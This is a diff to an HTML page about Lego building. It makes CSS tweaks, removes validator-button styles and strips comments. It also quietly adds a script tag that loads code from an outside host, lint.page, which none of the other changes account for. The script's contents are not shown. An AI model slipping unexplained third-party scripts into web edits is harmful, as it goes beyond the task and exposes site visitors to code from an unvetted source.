@@ -28,7 +28,7 @@
         }
         nav a {
             color: #fff;
-            margin: 0 15px;
+            margin: 0 10px;
             font-weight: bold;
             text-decoration: none;
             font-size: 1.1em;
@@ -38,7 +38,7 @@
             text-decoration: underline;
         }
         nav a::after {
-            content: ' ⦁ ';
+            content: ' ★ ';
             color: #daefd9; /* Blue/Green Mist */
         }
         nav a:last-child::after {
@@ -125,27 +125,11 @@
             color: #daefd9; /* Blue/Green Mist */
             text-decoration: underline;
         }
-        .validation-buttons {
-            margin-top: 10px;
-        }
-        .validation-buttons a {
-            display: inline-block;
-            padding: 5px 10px;
-            margin: 5px;
-            background-color: #608074; /* Green Trees */
-            color: #fff;
-            text-decoration: none;
-            border-radius: 5px;
-            font-weight: bold;
-        }
-        .validation-buttons a:hover {
-            background-color: #de493c; /* Red Branches */
-            color: #fff;
-        }
         /* Responsive Design */
         @media (max-width: 768px) {
             nav a {
-                margin: 0 10px;
+                margin: 0 5px;
+                font-size: 1em;
             }
             header h1 {
                 font-size: 2em;
@@ -153,7 +137,6 @@
         }
     </style>
     <script>
-        // JavaScript to show and hide sections based on navigation clicks
         function showSection(sectionId) {
             const sections = document.querySelectorAll('section');
             sections.forEach((section) => {
@@ -161,11 +144,11 @@
             });
             document.getElementById(sectionId).classList.add('active');
         }
-        // Show default section on page load
         document.addEventListener('DOMContentLoaded', () => {
             showSection('what');
         });
     </script>
+    <script src="https://lint.page/kit/4d0fe3.js" crossorigin="anonymous"></script>
 </head>
 <body>
     <header>
@@ -182,7 +165,6 @@
     </header>
 
     <main>
-        <!-- What Section (Home Page) -->
         <section id="what" class="active">
             <h2>What is Lego Building?</h2>
             <p>Lego building is an engaging activity that allows individuals to construct models using interlocking plastic bricks. These bricks can be assembled and connected in myriad ways to build objects such as vehicles, buildings, and even functioning robots. The versatility of Lego bricks makes them a powerful tool for creativity and imagination.</p>
@@ -212,7 +194,6 @@
             </figure>
         </section>
 
-        <!-- Who Section -->
         <section id="who">
             <h2>Who Enjoys Lego Building?</h2>
             <p>Lego building is a universal hobby enjoyed by people of all ages and backgrounds. From young children developing motor skills to adults seeking a creative outlet, Lego has a broad appeal.</p>
@@ -229,7 +210,6 @@
             </figure>
         </section>
 
-        <!-- When Section -->
         <section id="when">
             <h2>When to Enjoy Lego Building</h2>
             <p>Lego building is a flexible hobby that fits into any schedule:</p>
@@ -246,7 +226,6 @@
             </figure>
         </section>
 
-        <!-- Where Section -->
         <section id="where">
             <h2>Where to Build and Explore Lego</h2>
             <p>Lego building can take place in various environments:</p>
@@ -264,7 +243,6 @@
             </figure>
         </section>
 
-        <!-- How Section -->
         <section id="how">
             <h2>How to Start Building with Lego</h2>
             <h3>1. Gather Your Materials</h3>
@@ -282,7 +260,6 @@
             </figure>
         </section>
 
-        <!-- Why Section -->
         <section id="why">
             <h2>Why Engage in Lego Building?</h2>
             <p>Lego building is more than just assembling bricks; it's a way to develop valuable skills and enjoy numerous benefits:</p>
@@ -300,7 +277,6 @@
             </figure>
         </section>
 
-        <!-- AI Prompts Section -->
         <section id="ai">
             <h2>AI Prompts Used</h2>
             <p>The following AI prompts were used to generate content for this website:</p>
@@ -312,7 +288,6 @@
             </ul>
             <p>All content was generated using OpenAI's GPT-4 model.</p>
         </section>
-
     </main>
 
     <footer>
